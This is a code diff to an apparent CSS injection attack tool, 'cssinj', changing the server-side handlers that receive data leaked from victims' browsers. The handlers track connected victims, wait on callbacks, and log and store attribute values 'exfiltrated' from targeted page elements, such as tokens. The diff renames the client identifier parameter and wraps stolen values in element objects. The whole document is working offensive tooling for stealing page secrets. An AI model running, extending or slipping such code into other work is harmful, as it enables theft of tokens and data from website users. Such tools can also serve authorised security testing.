@@ -3,6 +3,7 @@ import asyncio
 from cssinj import injection
 from cssinj.client import Client, Clients
 from cssinj.console import Console
+from cssinj.dom import Attribut, Element
 
 
 class CSSInjector:
@@ -39,6 +40,7 @@ class CSSInjector:
         self.console.log("connection", f"Connection from {client.host}")
         self.console.log("connection_details", f"ID : {client.id}")
         client.event.set()
+
         if self.show_details:
             for key, value in request.headers.items():
                 self.console.log("connection_details", f"{key} : {value}")
@@ -49,15 +51,20 @@ class CSSInjector:
         )
 
     async def handle_end(self, request):
-        client_id = request.query.get("id")
+        client_id = request.query.get("client_id")
+
         client = self.clients[client_id]
-        client.elements.append(client.data)
+        element = Element(name=self.element)
+        element.attributs.append(Attribut(name=self.attribut, value=client.data))
+        client.elements.append(element)
+
         client.event.set()
 
         self.console.log(
             "end_exfiltration",
             f"[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}",
         )
+
         client.data = ""
 
         return web.Response(
@@ -66,9 +73,11 @@ class CSSInjector:
         )
 
     async def handle_next(self, request):
-        client_id = request.query.get("id")
+        client_id = request.query.get("client_id")
         client = self.clients[client_id]
+
         client.counter += 1
+
         await client.event.wait()
         client.event.clear()
 
@@ -84,13 +93,13 @@ class CSSInjector:
         )
 
     async def handle_valid(self, request):
-        client_id = request.query.get("id")
+        client_id = request.query.get("client_id")
         client = self.clients[client_id]
 
         client.event.set()
 
         client.data = request.query.get("token")
-
+    
         if self.show_details:
             self.console.log(
                 "exfiltration",
